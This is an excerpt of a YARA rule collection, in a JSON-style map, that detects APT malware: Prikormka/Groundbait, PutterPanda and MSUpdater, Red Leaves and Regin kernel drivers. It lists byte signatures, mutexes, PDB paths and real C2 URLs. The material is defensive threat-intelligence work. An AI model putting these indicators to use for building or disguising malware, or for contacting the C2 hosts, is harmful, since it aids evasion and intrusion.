  "PrikormkaDropper": "rule PrikormkaDropper\n{\n    \n    strings:\n        $mz = { 4D 5A }\n        $kd1 = \"KDSTORAGE\" wide\n        $kd2 = \"KDSTORAGE_64\" wide\n        $kd3 = \"KDRUNDRV32\" wide\n        $kd4 = \"KDRAR\" wide\n        $bin1 = {69 65 04 15 00 14 1E 4A 16 42 08 6C 21 61 24 0F}\n        $bin2 = {76 6F 05 04 16 1B 0D 5E 0D 42 08 6C 20 45 18 16}\n        $bin3 = {4D 00 4D 00 43 00 00 00 67 00 75 00 69 00 64 00 56 00 47 00 41 00 00 00 5F 00 73 00 76 00 67 00}\n        $inj1 = \"?AVCinj2008Dlg@@\" ascii\n        $inj2 = \"?AVCinj2008App@@\" ascii\n\n    condition:\n        ($mz at 0) and ((any of ($bin*)) or (3 of ($kd*)) or (all of ($inj*)))\n}",
  "PrikormkaModule": "rule PrikormkaModule\n{\n    \n    strings:\n        $mz = { 4D 5A }\n\n        // binary\n        $str1 = {6D 70 2E 64 6C 6C 00 53 74 61 72 74 69 6E 67 00}\n        $str2 = {68 6C 70 75 63 74 66 2E 64 6C 6C 00 43 79 63 6C 65}\n        $str3 = {00 6B 6C 2E 64 6C 6C 00 53 74 61 72 74 69 6E 67 00}\n        $str4 = {69 6F 6D 75 73 2E 64 6C 6C 00 53 74 61 72 74 69 6E 67}\n        $str5 = {61 74 69 6D 6C 2E 64 6C 6C 00 4B 69 63 6B 49 6E 50 6F 69 6E 74}\n        $str6 = {73 6E 6D 2E 64 6C 6C 00 47 65 74 52 65 61 64 79 46 6F 72 44 65 61 64}\n        $str7 = {73 63 72 73 68 2E 64 6C 6C 00 47 65 74 52 65 61 64 79 46 6F 72 44 65 61 64}\n\n        // encrypted\n        $str8 = {50 52 55 5C 17 51 58 17 5E 4A}\n        $str9 = {60 4A 55 55 4E 53 58 4B 17 52 57 17 5E 4A}\n        $str10 = {55 52 5D 4E 5B 4A 5D 17 51 58 17 5E 4A}\n        $str11 = {60 4A 55 55 4E 61 17 51 58 17 5E 4A}\n        $str12 = {39 5D 17 1D 1C 0A 3C 57 59 3B 1C 1E 57 58 4C 54 0F}\n\n        // mutex\n        $str13 = \"ZxWinDeffContex\" ascii wide\n        $str14 = \"Paramore756Contex43\" wide\n        $str15 = \"Zw_&one@ldrContext43\" wide\n\n        // other\n        $str16 = \"A95BL765MNG2GPRS\"\n\n        // dll names\n        $str17 = \"helpldr.dll\" wide fullword\n        $str18 = \"swma.dll\" wide fullword\n        $str19 = \"iomus.dll\" wide fullword\n        $str20 = \"atiml.dll\"  wide fullword\n        $str21 = \"hlpuctf.dll\" wide fullword\n        $str22 = \"hauthuid.dll\" ascii wide fullword\n\n        // rbcon\n        $str23 = \"[roboconid][%s]\" ascii fullword\n        $str24 = \"[objectset][%s]\" ascii fullword\n        $str25 = \"rbcon.ini\" wide fullword\n\n        // files and logs\n        $str26 = \"%s%02d.%02d.%02d_%02d.%02d.%02d.skw\" ascii fullword\n        $str27 = \"%02d.%02d.%02d_%02d.%02d.%02d.%02d.rem\" wide fullword\n\n        // pdb strings\n        $str28 = \":\\\\!PROJECTS!\\\\Mina\\\\2015\\\\\" ascii\n        $str29 = \"\\\\PZZ\\\\RMO\\\\\" ascii\n        $str30 = \":\\\\work\\\\PZZ\" ascii\n        $str31 = \"C:\\\\Users\\\\mlk\\\\\" ascii\n        $str32 = \":\\\\W o r k S p a c e\\\\\" ascii\n        $str33 = \"D:\\\\My\\\\Projects_All\\\\2015\\\\\" ascii\n        $str34 = \"\\\\TOOLS PZZ\\\\Bezzahod\\\\\" ascii\n\n    condition:\n        ($mz at 0) and (any of ($str*))\n}",
  "PrikormkaEarlyVersion": "rule PrikormkaEarlyVersion\n{\n    \n    strings:\n        $mz = { 4D 5A }\n        $str36 = \"IntelRestore\" ascii fullword\n        $str37 = \"Resent\" wide fullword\n        $str38 = \"ocp8.1\" wide fullword\n        $str39 = \"rsfvxd.dat\" ascii fullword\n        $str40 = \"tsb386.dat\" ascii fullword\n        $str41 = \"frmmlg.dat\" ascii fullword\n        $str42 = \"smdhost.dll\" ascii fullword\n        $str43 = \"KDLLCFX\" wide fullword\n        $str44 = \"KDLLRUNDRV\" wide fullword\n  \n    condition:\n        ($mz at 0) and (2 of ($str*))\n}",
  "Prikormka": "rule Prikormka\n{\n    \n    meta:\n        Author      = \"Anton Cherepanov\"\n        Date        = \"2016/05/10\"\n        Description = \"Operation Groundbait\"\n        Source = \"https://github.com/eset/malware-ioc/\"\n        Contact = \"threatintel@eset.com\"\n        License = \"BSD 2-Clause\"\n    \n    condition:\n        PrikormkaDropper or PrikormkaModule or PrikormkaEarlyVersion\n}",
  "APT_Malware_PutterPanda_Rel": "rule APT_Malware_PutterPanda_Rel \n{\n\n    meta:\n        description = \"Detects an APT malware related to PutterPanda\"\n        author = \"Florian Roth\"\n        score = 70\n        reference = \"VT Analysis\"\n        date = \"2015-06-03\"\n        hash = \"5367e183df155e3133d916f7080ef973f7741d34\"\n\n    strings:\n        $x0 = \"app.stream-media.net\" fullword ascii /* score: '12.03' */\n        $x1 = \"File %s does'nt exist or is forbidden to acess!\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '16.035' */\n        $s6 = \"GetProcessAddresss of pHttpQueryInfoA Failed!\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.02' */\n        $s7 = \"Connect %s error!\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '16.04' */\n        $s9 = \"Download file %s successfully!\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.03' */\n        $s10 = \"index.tmp\" fullword ascii /* score: '14.03' */\n        $s11 = \"Execute PE Successfully\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '13.03' */\n        $s13 = \"aa/22/success.xml\" fullword ascii /* score: '12.005' */\n        $s16 = \"aa/22/index.asp\" fullword ascii /* score: '11.02' */\n        $s18 = \"File %s a Non-Pe File\" fullword ascii /* score: '8.04' */\n        $s19 = \"SendRequset error!\" fullword ascii /* score: '8.04' */\n        $s20 = \"filelist[%d]=%s\" fullword ascii /* score: '7.015' */\n\n    condition:\n        ( uint16(0) == 0x5a4d and 1 of ($x*) ) or ( 4 of ($s*) )\n}",
  "APT_Malware_PutterPanda_Rel_2": "rule APT_Malware_PutterPanda_Rel_2 \n{\n\n    meta:\n        description = \"APT Malware related to PutterPanda Group\"\n        author = \"Florian Roth\"\n        score = 70\n        reference = \"VT Analysis\"\n        date = \"2015-06-03\"\n        hash = \"f97e01ee04970d1fc4d988a9e9f0f223ef2a6381\"\n\n    strings:\n        $s0 = \"http://update.konamidata.com/test/zl/sophos/td/result/rz.dat?\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.01' */\n        $s1 = \"http://update.konamidata.com/test/zl/sophos/td/index.dat?\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.01' */\n        $s2 = \"Mozilla/4.0 (Compatible; MSIE 6.0;)\" fullword ascii /* PEStudio Blacklist: agent */ /* score: '20.03' */\n        $s3 = \"Internet connect error:%d\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.035' */\n        $s4 = \"Proxy-Authorization:Basic\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.02' */\n        $s5 = \"HttpQueryInfo failed:%d\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '13.015' */\n        $s6 = \"read file error:%d\" fullword ascii /* score: '11.04' */\n        $s7 = \"downdll.dll\" fullword ascii /* score: '11.025' */\n        $s8 = \"rz.dat\" fullword ascii /* score: '10.005' */\n        $s9 = \"Invalid url\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.03' */\n        $s10 = \"Create file failed\" fullword ascii /* score: '8.045' */\n        $s11 = \"myAgent\" fullword ascii /* score: '8.025' */\n        $s12 = \"%s%s%d%d\" fullword ascii /* score: '8.005' */\n        $s13 = \"down file success\" fullword ascii /* score: '7.035' */\n        $s15 = \"error!\" fullword ascii /* score: '6.04' */\n        $s18 = \"Avaliable data:%u bytes\" fullword ascii /* score: '5.025' */\n    \n    condition:\n        uint16(0) == 0x5a4d and 6 of them\n}",
  "APT_Malware_PutterPanda_PSAPI": "rule APT_Malware_PutterPanda_PSAPI \n{\n\n    meta:\n        description = \"Detects a malware related to Putter Panda\"\n        author = \"Florian Roth\"\n        score = 70\n        reference = \"VT Analysis\"\n        date = \"2015-06-03\"\n        hash = \"f93a7945a33145bb6c106a51f08d8f44eab1cdf5\"\n\n    strings:\n        $s0 = \"LOADER ERROR\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '12.03' */\n        $s1 = \"The procedure entry point %s could not be located in the dynamic link library %s\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.045' */\n        $s2 = \"psapi.dll\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 54 times */\n        $s3 = \"urlmon.dll\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 471 times */\n        $s4 = \"WinHttpGetProxyForUrl\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 179 times */\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and all of them\n}",
  "APT_Malware_PutterPanda_WUAUCLT": "rule APT_Malware_PutterPanda_WUAUCLT \n{\n\n    meta:\n        description = \"Detects a malware related to Putter Panda\"\n        author = \"Florian Roth\"\n        score = 70\n        reference = \"VT Analysis\"\n        date = \"2015-06-03\"\n        hash = \"fd5ca5a2d444865fa8320337467313e4026b9f78\"\n    \n    strings:\n        $x0 = \"WUAUCLT.EXE\" fullword wide /* PEStudio Blacklist: strings */ /* score: '20.01' */\n        $x1 = \"%s\\\\tmp%d.exe\" fullword ascii /* score: '14.01' */   \n        $x2 = \"Microsoft Corporation. All rights reserved.\" fullword wide /* score: '8.04' */\n        $s1 = \"Microsoft Windows Operating System\" fullword wide /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 4 times */\n        $s2 = \"InternetQueryOptionA\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 166 times */\n        $s3 = \"LookupPrivilegeValueA\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 336 times */\n        $s4 = \"WNetEnumResourceA\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 29 times */\n        $s5 = \"HttpSendRequestExA\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 87 times */\n        $s6 = \"PSAPI.DLL\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 420 times */\n        $s7 = \"Microsoft(R) Windows(R) Operating System\" fullword wide /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 128 times */\n        $s8 = \"CreatePipe\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 222 times */\n        $s9 = \"EnumProcessModules\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 410 times */\n\n    condition:\n        all of ($x*) or (1 of ($x*) and all of ($s*) )\n}",
  "APT_Malware_PutterPanda_Gen1": "rule APT_Malware_PutterPanda_Gen1 \n{\n\n    meta:\n        description = \"Detects a malware \"\n        author = \"YarGen Rule Generator\"\n        reference = \"not set\"\n        date = \"2015-06-03\"\n        super_rule = 1\n        hash0 = \"bf1d385e637326a63c4d2f253dc211e6a5436b6a\"\n        hash1 = \"76459bcbe072f9c29bb9703bc72c7cd46a692796\"\n        hash2 = \"e105a7a3a011275002aec4b930c722e6a7ef52ad\"\n\n    strings:\n        $s1 = \"%s%duserid=%dthreadid=%dgroupid=%d\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '22.02' */\n        $s2 = \"ssdpsvc.dll\" fullword ascii /* score: '11.00' */\n        $s3 = \"Fail %s \" fullword ascii /* score: '10.04' */\n        $s4 = \"%s%dpara1=%dpara2=%dpara3=%d\" fullword ascii /* score: '10.01' */\n        $s5 = \"LsaServiceInit\" fullword ascii /* score: '7.03' */\n        $s6 = \"%-8d Fs %-12s Bs \" fullword ascii /* score: '5.04' */\n        $s7 = \"Microsoft DH SChannel Cryptographic Provider\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5.00' */ /* Goodware String - occured 5 times */\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and 5 of them\n}",
  "Malware_MsUpdater_String_in_EXE": "rule Malware_MsUpdater_String_in_EXE  \n{\n\n    meta:\n        description = \"MSUpdater String in Executable\"\n        author = \"Florian Roth\"\n        score = 50\n        reference = \"VT Analysis\"\n        date = \"2015-06-03\"\n        hash = \"b1a2043b7658af4d4c9395fa77fde18ccaf549bb\"\n\n    strings:\n        $x1 = \"msupdate.exe\" fullword wide /* PEStudio Blacklist: strings */ /* score: '20.01' */\n        // $x2 = \"msupdate\" fullword wide /* PEStudio Blacklist: strings */ /* score: '13.01' */\n        $x3 = \"msupdater.exe\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.02' */\n        $x4 = \"msupdater32.exe\" fullword ascii\n        $x5 = \"msupdater32.exe\" fullword wide\n        $x6 = \"msupdate.pif\" fullword ascii\n        $fp1 = \"_msupdate_\" wide /* False Positive */\n        $fp2 = \"_msupdate_\" ascii /* False Positive */\n        $fp3 = \"/kies\" wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and ( 1 of ($x*) ) and not ( 1 of ($fp*) ) \n}",
  "APT_Malware_PutterPanda_MsUpdater_3": "rule APT_Malware_PutterPanda_MsUpdater_3 \n{\n\n    meta:\n        description = \"Detects Malware related to PutterPanda - MSUpdater\"\n        author = \"Florian Roth\"\n        score = 70\n        reference = \"VT Analysis\"\n        date = \"2015-06-03\"\n        hash = \"464149ff23f9c7f4ab2f5cadb76a4f41f969bed0\"\n\n    strings:\n        $s0 = \"msupdater.exe\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.02' */\n        $s1 = \"Explorer.exe \\\"\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '16.05' */\n        $s2 = \"FAVORITES.DAT\" fullword ascii /* score: '11.02' */\n        $s4 = \"COMSPEC\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.82' */ /* Goodware String - occured 178 times */\n   \n    condition:\n        uint16(0) == 0x5a4d and 3 of them\n}",
  "APT_Malware_PutterPanda_MsUpdater_1": "rule APT_Malware_PutterPanda_MsUpdater_1 \n{\n\n    meta:\n        description = \"Detects Malware related to PutterPanda - MSUpdater\"\n        author = \"Florian Roth\"\n        score = 70\n        reference = \"VT Analysis\"\n        date = \"2015-06-03\"\n        hash = \"b55072b67543f58c096571c841a560c53d72f01a\"\n\n    strings:\n        $x0 = \"msupdate.exe\" fullword wide /* PEStudio Blacklist: strings */ /* score: '20.01' */\n        $x1 = \"msupdate\" fullword wide /* PEStudio Blacklist: strings */ /* score: '13.01' */\n        $s1 = \"Microsoft Corporation. All rights reserved.\" fullword wide /* score: '8.04' */\n        $s2 = \"Automatic Updates\" fullword wide /* PEStudio Blacklist: strings */ /* score: '4.98' */ /* Goodware String - occured 22 times */\n        $s3 = \"VirtualProtectEx\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.93' */ /* Goodware String - occured 68 times */\n        $s4 = \"Invalid parameter\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.93' */ /* Goodware String - occured 69 times */\n        $s5 = \"VirtualAllocEx\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.91' */ /* Goodware String - occured 95 times */\n        $s6 = \"WriteProcessMemory\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.87' */ /* Goodware String - occured 131 times */\n    condition:\n        ( uint16(0) == 0x5a4d and 1 of ($x*) and 4 of ($s*) ) or ( 1 of ($x*) and all of ($s*) ) \n}",
  "APT_Malware_PutterPanda_MsUpdater_2": "rule APT_Malware_PutterPanda_MsUpdater_2 \n{\n\n    meta:\n        description = \"Detects Malware related to PutterPanda - MSUpdater\"\n        author = \"Florian Roth\"\n        score = 70\n        reference = \"VT Analysis\"\n        date = \"2015-06-03\"\n        hash = \"365b5537e3495f8ecfabe2597399b1f1226879b1\"\n   \n    strings:\n        $s0 = \"winsta0\\\\default\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.99' */ /* Goodware String - occured 6 times */\n        $s1 = \"EXPLORER.EXE\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.98' */ /* Goodware String - occured 22 times */\n        $s2 = \"WNetEnumResourceA\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.97' */ /* Goodware String - occured 29 times */\n        $s3 = \"explorer.exe\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.97' */ /* Goodware String - occured 31 times */\n        $s4 = \"CreateProcessAsUserA\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.91' */ /* Goodware String - occured 86 times */\n        $s5 = \"HttpSendRequestExA\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.91' */ /* Goodware String - occured 87 times */\n        $s6 = \"HttpEndRequestA\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.91' */ /* Goodware String - occured 91 times */\n        $s7 = \"GetModuleBaseNameA\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.88' */ /* Goodware String - occured 121 times */\n        $s8 = \"GetModuleFileNameExA\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.86' */ /* Goodware String - occured 144 times */\n        $s9 = \"HttpSendRequestA\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.85' */ /* Goodware String - occured 154 times */\n        $s10 = \"HttpOpenRequestA\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.84' */ /* Goodware String - occured 159 times */\n        $s11 = \"InternetConnectA\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.82' */ /* Goodware String - occured 183 times */\n        $s12 = \"Process32Next\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.80' */ /* Goodware String - occured 204 times */\n        $s13 = \"Process32First\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.79' */ /* Goodware String - occured 210 times */\n        $s14 = \"CreatePipe\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.78' */ /* Goodware String - occured 222 times */\n        $s15 = \"EnumProcesses\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.73' */ /* Goodware String - occured 273 times */\n        $s16 = \"LookupPrivilegeValueA\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.66' */ /* Goodware String - occured 336 times */\n        $s17 = \"PeekNamedPipe\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.65' */ /* Goodware String - occured 347 times */\n        $s18 = \"EnumProcessModules\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.59' */ /* Goodware String - occured 410 times */\n        $s19 = \"PSAPI.DLL\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.58' */ /* Goodware String - occured 420 times */\n        $s20 = \"SPSSSQ\" fullword ascii /* score: '4.51' */\n   \n    condition:\n        uint16(0) == 0x5a4d and filesize < 220KB and all of them\n}",
  "APT_Malware_PutterPanda_Gen4": "rule APT_Malware_PutterPanda_Gen4 \n{\n\n    meta:\n        description = \"Detects Malware related to PutterPanda\"\n        author = \"Florian Roth\"\n        score = 70\n        reference = \"VT Analysis\"\n        date = \"2015-06-03\"\n        super_rule = 1\n        hash0 = \"71a8378fa8e06bcf8ee9f019c807c6bfc58dca0c\"\n        hash1 = \"8fdd6e5ed9d69d560b6fdd5910f80e0914893552\"\n        hash2 = \"3c4a762175326b37035a9192a981f7f4cc2aa5f0\"\n        hash3 = \"598430b3a9b5576f03cc4aed6dc2cd8a43324e1e\"\n        hash4 = \"6522b81b38747f4aa09c98fdaedaed4b00b21689\"\n\n    strings:\n        $x1 = \"rz.dat\" fullword ascii /* score: '10.00' */\n        $s0 = \"Mozilla/4.0 (Compatible; MSIE 6.0;)\" fullword ascii /* PEStudio Blacklist: agent */ /* score: '20.03' */\n        $s1 = \"Internet connect error:%d\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.04' */\n        $s2 = \"Proxy-Authorization:Basic \" fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.02' */\n        $s5 = \"Invalid url\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.03' */\n        $s6 = \"Create file failed\" fullword ascii /* score: '8.04' */\n        $s7 = \"myAgent\" fullword ascii /* score: '8.03' */\n        $z1 = \"%s%s%d%d\" fullword ascii /* score: '8.00' */\n        $z2 = \"HttpQueryInfo failed:%d\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '13.02' */\n        $z3 = \"read file error:%d\" fullword ascii /* score: '11.04' */\n        $z4 = \"down file success\" fullword ascii /* score: '7.04' */\n        $z5 = \"kPStoreCreateInstance\" fullword ascii /* score: '5.03' */\n        $z6 = \"Avaliable data:%u bytes\" fullword ascii /* score: '5.03' */\n        $z7 = \"abe2869f-9b47-4cd9-a358-c22904dba7f7\" fullword ascii /* PEStudio Blacklist: guid */ /* score: '5.00' */ /* Goodware String - occured 2 times */\n\n    condition:\n        filesize < 300KB and (( uint16(0) == 0x5a4d and $x1 and 3 of ($s*) ) or ( 3 of ($s*) and 4 of ($z*) ))\n}",
  "malware_red_leaves_generic": "rule malware_red_leaves_generic {\n  meta:\n    author = \"David Cannings\"\n    description = \"Red Leaves malware, related to APT10\"\n    \n    // This hash from VT retrohunt, original sample was a memory dump\n    sha256 = \"2e1f902de32b999642bb09e995082c37a024f320c683848edadaf2db8e322c3c\"\n    \n  strings:\n    // MiniLZO release date\n    $ = \"Feb 04 2015\"\n    $ = \"I can not start %s\"\n    $ = \"dwConnectPort\" fullword\n    $ = \"dwRemoteLanPort\" fullword\n    $ = \"strRemoteLanAddress\" fullword\n    $ = \"strLocalConnectIp\" fullword\n    $ = \"\\\\\\\\.\\\\pipe\\\\NamePipe_MoreWindows\" wide\n    $ = \"RedLeavesCMDSimulatorMutex\" wide\n    $ = \"(NT %d.%d Build %d)\" wide\n    $ = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)\" wide\n    $ = \"red_autumnal_leaves_dllmain.dll\" wide ascii\n    $ = \"__data\" wide\n    $ = \"__serial\" wide\n    $ = \"__upt\" wide\n    $ = \"__msgid\" wide\n    \n  condition:\n    7 of them\n}",
  "malware_red_leaves_memory": "rule malware_red_leaves_memory {\n  meta:\n    author = \"David Cannings\"\n    description = \"Red Leaves C&C left in memory, use with Volatility / Rekall\"\n    \n  strings:\n    $ = \"__msgid=\" wide ascii\n    $ = \"__serial=\" wide ascii\n    $ = \"OnlineTime=\" wide\n\n    // Indicates a file transfer\n    $ = \"clientpath=\" wide ascii \n    $ = \"serverpath=\" wide ascii\n\n  condition:\n    3 of them\n}",
  "Regin_APT_KernelDriver_Generic_A": "rule Regin_APT_KernelDriver_Generic_A \n{\n\n    meta:\n        description = \"Generic rule for Regin APT kernel driver Malware - Symantec http://t.co/qu53359Cb2\"\n        author = \"@Malwrsignatures - included in APT Scanner THOR\"\n        date = \"23.11.14\"\n        hash1 = \"187044596bc1328efa0ed636d8aa4a5c\"\n        hash2 = \"06665b96e293b23acc80451abb413e50\"\n        hash3 = \"d240f06e98c8d3e647cbf4d442d79475\"\n\n    strings:\n        $m0 = { 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 } \n        $m1 = { 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 6d 6f 64 65 2e }    \n        $s0 = \"atapi.sys\" fullword wide\n        $s1 = \"disk.sys\" fullword wide\n        $s3 = \"h.data\" fullword ascii\n        $s4 = \"\\\\system32\" fullword ascii\n        $s5 = \"\\\\SystemRoot\" fullword ascii\n        $s6 = \"system\" fullword ascii\n        $s7 = \"temp\" fullword ascii\n        $s8 = \"windows\" fullword ascii\n        $x1 = \"LRich6\" fullword ascii\n        $x2 = \"KeServiceDescriptorTable\" fullword ascii     \n    \n    condition:\n        $m0 at 0 and $m1 and all of ($s*) and 1 of ($x*)\n}",
  "Regin_APT_KernelDriver_Generic_B": "rule Regin_APT_KernelDriver_Generic_B \n{\n\n    meta:\n        description = \"Generic rule for Regin APT kernel driver Malware - Symantec http://t.co/qu53359Cb2\"\n        author = \"@Malwrsignatures - included in APT Scanner THOR\"\n        date = \"23.11.14\"\n        hash1 = \"ffb0b9b5b610191051a7bdf0806e1e47\"\n        hash2 = \"bfbe8c3ee78750c3a520480700e440f8\"\n        hash3 = \"b29ca4f22ae7b7b25f79c1d4a421139d\"\n        hash4 = \"06665b96e293b23acc80451abb413e50\"\n        hash5 = \"2c8b9d2885543d7ade3cae98225e263b\"\n        hash6 = \"4b6b86c7fec1c574706cecedf44abded\"\n        hash7 = \"187044596bc1328efa0ed636d8aa4a5c\"\n        hash8 = \"d240f06e98c8d3e647cbf4d442d79475\"\n        hash9 = \"6662c390b2bbbd291ec7987388fc75d7\"\n        hash10 = \"1c024e599ac055312a4ab75b3950040a\"\n        hash11 = \"ba7bb65634ce1e30c1e5415be3d1db1d\"\n        hash12 = \"b505d65721bb2453d5039a389113b566\"\n        hash13 = \"b269894f434657db2b15949641a67532\"\n\n    strings:\n        $m0 = { 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 } \n        $s1 = { 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 6d 6f 64 65 2e }\n        $s2 = \"H.data\" fullword ascii nocase\n        $s3 = \"INIT\" fullword ascii\n        $s4 = \"ntoskrnl.exe\" fullword ascii\n        $v1 = \"\\\\system32\" fullword ascii\n        $v2 = \"\\\\SystemRoot\" fullword ascii\n        $v3 = \"KeServiceDescriptorTable\" fullword ascii \n        $w1 = \"\\\\system32\" fullword ascii\n        $w2 = \"\\\\SystemRoot\" fullword ascii     \n        $w3 = \"LRich6\" fullword ascii        \n        $x1 = \"_snprintf\" fullword ascii\n        $x2 = \"_except_handler3\" fullword ascii\n        $y1 = \"mbstowcs\" fullword ascii\n        $y2 = \"wcstombs\" fullword ascii\n        $y3 = \"KeGetCurrentIrql\" fullword ascii\n        $z1 = \"wcscpy\" fullword ascii\n        $z2 = \"ZwCreateFile\" fullword ascii\n        $z3 = \"ZwQueryInformationFile\" fullword ascii\n        $z4 = \"wcslen\" fullword ascii\n        $z5 = \"atoi\" fullword ascii\n   \n    condition:\n        $m0 at 0 and all of ($s*) and ( all of ($v*) or all of ($w*) or all of ($x*) or all of ($y*) or all of ($z*) ) and filesize < 20KB\n}",
  "Regin_APT_KernelDriver_Generic_C": "rule Regin_APT_KernelDriver_Generic_C \n{\n\n    meta:\n        description = \"Generic rule for Regin APT kernel driver Malware - Symantec http://t.co/qu53359Cb2\"\n        author = \"@Malwrsignatures - included in APT Scanner THOR\"\n        date = \"23.11.14\"\n        hash1 = \"e0895336617e0b45b312383814ec6783556d7635\"\n        hash2 = \"732298fa025ed48179a3a2555b45be96f7079712\"      \n\n    strings:\n        $m0 = { 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 }    \n        $s0 = \"KeGetCurrentIrql\" fullword ascii\n        $s1 = \"5.2.3790.0 (srv03_rtm.030324-2048)\" fullword wide\n        $s2 = \"usbclass\" fullword wide\n        $x1 = \"PADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDING\" ascii\n        $x2 = \"Universal Serial Bus Class Driver\" fullword wide\n        $x3 = \"5.2.3790.0\" fullword wide\n        $y1 = \"LSA Shell\" fullword wide\n        $y2 = \"0Richw\" fullword ascii       \n    \n    condition:\n        $m0 at 0 and all of ($s*) and ( all of ($x*) or all of ($y*) )  and filesize < 20KB\n}",
  "Regin_sig_svcsstat": "rule Regin_sig_svcsstat \n{\n\n    meta:\n        description = \"Detects svcstat from Regin report - file svcsstat.exe_sample\"\n        author = \"@MalwrSignatures\"\n        date = \"26.11.14\"\n        hash = \"5164edc1d54f10b7cb00a266a1b52c623ab005e2\"\n\n    strings:\n        $s0 = \"Service Control Manager\" fullword ascii\n        $s1 = \"_vsnwprintf\" fullword ascii\n        $s2 = \"Root Agency\" fullword ascii\n        $s3 = \"Root Agency0\" fullword ascii\n        $s4 = \"StartServiceCtrlDispatcherA\" fullword ascii\n        $s5 = \"\\\\\\\\?\\\\UNC\" fullword wide\n        $s6 = \"%ls%ls\" fullword wide\n\n    condition:\n        all of them and filesize < 15KB and filesize > 10KB \n}",
